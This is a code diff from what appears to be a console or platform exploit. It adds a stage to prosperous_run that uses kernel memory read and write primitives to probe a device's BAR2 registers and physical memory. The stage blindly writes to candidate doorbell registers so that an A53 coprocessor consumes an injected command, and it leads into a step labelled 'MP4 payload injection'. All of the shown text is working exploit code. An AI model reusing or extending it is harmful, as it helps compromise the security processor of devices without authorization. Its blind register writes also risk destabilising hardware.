@@ -335,6 +335,65 @@ int prosperous_run(void)
         kernel_copyout(dmap + 0x60600010ULL, &post_val, 4);
         printf("[TEST] PA 0x60600010 after c2p: 0x%08x (expect 0x41424344 if it worked)\n",
                post_val);
+
+        /* The A53 didn't consume our command - it needs a doorbell.
+         * Scan BAR2 offsets near c2p for potential doorbell registers.
+         * Read first, then we'll try writing to a candidate.
+         *
+         * c2p data regs: 0xF6000-0xFA000 (core 0), 0xFB000+ (core 1)
+         * p2c reg: 0x10500
+         * Check surrounding areas for control/doorbell regs. */
+        printf("\n[*] Scanning for c2p doorbell register...\n");
+        {
+            uint32_t doorbell_offsets[] = {
+                0x0F5000, 0x0F5800, 0x0F5C00,  /* just before c2p */
+                0x0FB800, 0x0FC000, 0x0FD000,  /* after core 1 c2p */
+                0x0FE000, 0x0FF000,             /* end of 0xF range */
+                0x010000, 0x010400, 0x010800,   /* near p2c */
+                0x011000, 0x012000, 0x013000,   /* p2c area */
+            };
+            for (int i = 0; i < 14; i++) {
+                uint32_t v;
+                kernel_copyout(bar2 + doorbell_offsets[i], &v, 4);
+                printf("[DB] BAR2+0x%06x = 0x%08x\n", doorbell_offsets[i], v);
+            }
+        }
+
+        /* Try writing 1 to several candidate doorbell offsets and
+         * check if c2p reg0 gets consumed after each write.
+         * First re-check that our command is still pending. */
+        kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &post_cmd, 4);
+        printf("\n[*] c2p reg0 before doorbell attempts: 0x%08x\n", post_cmd);
+
+        if (post_cmd != 0) {
+            /* Try doorbell candidates one at a time */
+            uint32_t db_candidates[] = {
+                0x0F5000, 0x0FB800, 0x010000, 0x010400,
+            };
+            uint32_t db_val = 1;
+            for (int i = 0; i < 4; i++) {
+                kernel_copyin(&db_val, bar2 + db_candidates[i], 4);
+                usleep(10000); /* 10ms */
+                kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &post_cmd, 4);
+                printf("[DB] Wrote 1 to +0x%06x -> c2p reg0=0x%08x%s\n",
+                       db_candidates[i], post_cmd,
+                       post_cmd == 0 ? " CONSUMED!" : "");
+                if (post_cmd == 0)
+                    break;
+            }
+        }
+
+        /* Also try: wait 1 full second in case firmware polls slowly */
+        if (post_cmd != 0) {
+            printf("[*] Waiting 1 second for slow poll...\n");
+            usleep(1000000);
+            kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &post_cmd, 4);
+            printf("[C2P] reg0 after 1s: 0x%08x\n", post_cmd);
+        }
+
+        /* Final check: did the DRAM value change? */
+        kernel_copyout(dmap + 0x60600010ULL, &post_val, 4);
+        printf("[TEST] Final PA 0x60600010 = 0x%08x\n", post_val);
     }
 
     /* Phase 2: MP4 payload injection */
